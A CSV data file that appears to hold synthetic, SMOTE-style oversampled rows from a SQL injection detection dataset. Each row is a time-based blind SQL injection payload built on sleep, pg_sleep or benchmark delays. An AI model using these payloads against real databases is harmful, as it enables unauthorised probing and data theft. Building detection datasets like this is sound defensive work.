id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,time,"1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000206,0.6492590758694373
SMOTE_000002,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000292,0.924367126753924
SMOTE_000003,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000155,0.5419452578175097
SMOTE_000004,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""zxks""  =  ""zxks",nearest_attack_euclidean,R000234,0.7748367852799806
SMOTE_000005,attack,time,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,nearest_attack_euclidean,R000129,0.1556769799675109
SMOTE_000006,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000057,1.3579142080670628
SMOTE_000007,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R000302,0.55914609007046
SMOTE_000008,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000199,1.2258788269635532
SMOTE_000009,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000257,1.5883389386765492
SMOTE_000010,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000138,1.4228081530953984
SMOTE_000011,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000253,0.30691113303967305
SMOTE_000012,attack,time,"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000166,0.08853952211319592
SMOTE_000013,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000282,0.36121885134864407
SMOTE_000014,attack,time,"1""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000089,0.140121700107653
SMOTE_000015,attack,time,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000132,0.3608177622874601
SMOTE_000016,attack,time,1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,nearest_attack_euclidean,R000214,0.0442127028156425
SMOTE_000017,attack,time,"1%""   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000275,1.0603714581223824
SMOTE_000018,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000081,1.265225133459878
SMOTE_000019,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000232,0.9138012180339304
SMOTE_000020,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000232,1.0220375062981673
SMOTE_000021,attack,time,"1"" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000140,0.5996002645380675
SMOTE_000022,attack,time," select sleep  (  5  )   and    (    (   ""rthl"" like ""rthl",nearest_attack_euclidean,R000178,0.8568091055279375
SMOTE_000023,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000090,0.40718861505369425
SMOTE_000024,attack,time,"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000308,0.6577045595358153
SMOTE_000025,attack,time,1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000264,0.16004593837178427
SMOTE_000026,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000018,2.0813741828094443
SMOTE_000027,attack,time,"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000240,1.6475466665084808
SMOTE_000028,attack,time,"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000237,1.4194617524068687
